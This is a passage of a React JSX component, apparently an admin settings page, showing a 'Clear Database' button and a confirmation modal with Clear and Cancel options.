                onClick={() => setShowClearDbModal(true)}
                disabled={saving}
                className={`bg-red-500 text-white px-6 py-2 rounded ${
                  saving ? "opacity-50 cursor-not-allowed" : "hover:bg-red-600"
                } transition-colors`}
              >
                {saving ? "Clearing..." : "Clear Database"}
              </button>
            </div>
          </div>
        </section>

        {/* Clear Database Confirmation Modal */}
        {showClearDbModal && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <div className="bg-[#232A34] p-6 rounded-lg max-w-md w-full mx-4">
              <h3 className="text-white text-xl mb-4">
                Confirm Database Clear
              </h3>
              <p className="text-gray-400 mb-6">
                Are you sure you want to clear the database? This action cannot
                be undone.
              </p>
              <div className="flex space-x-4">
                <button
                  onClick={handleClearDatabase}
                  disabled={saving}
                  className={`bg-red-500 text-white px-6 py-2 rounded ${
                    saving
                      ? "opacity-50 cursor-not-allowed"
                      : "hover:bg-red-600"
                  } transition-colors`}
                >
                  {saving ? "Clearing..." : "Clear Database"}
                </button>
                <button
                  onClick={() => setShowClearDbModal(false)}
                  className="bg-gray-600 text-white px-6 py-2 rounded hover:bg-gray-700 transition-colors"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </Layout>
  );
}
